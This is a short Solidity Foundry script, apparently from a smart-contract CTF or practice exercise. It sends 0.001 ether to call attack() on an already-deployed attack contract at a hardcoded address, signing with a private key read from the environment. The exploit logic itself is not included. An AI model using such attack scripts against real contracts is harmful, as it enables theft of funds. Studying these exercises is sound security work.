// /*

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

// Attack contract address: "0xC8dAC9c94dbF2C8d435a34DeA906f52BE90b7361"

interface IAttack {
    function attack() external payable;
}

contract TriggerAttack is Script {
    IAttack public attack;
    address payable attackAddr =
        payable(0xC8dAC9c94dbF2C8d435a34DeA906f52BE90b7361);

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        vm.startBroadcast(privateKey);
        attack = IAttack(attackAddr);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey);
        attack.attack{value: 1000000000000000 wei}();
        vm.stopBroadcast();
    }
}
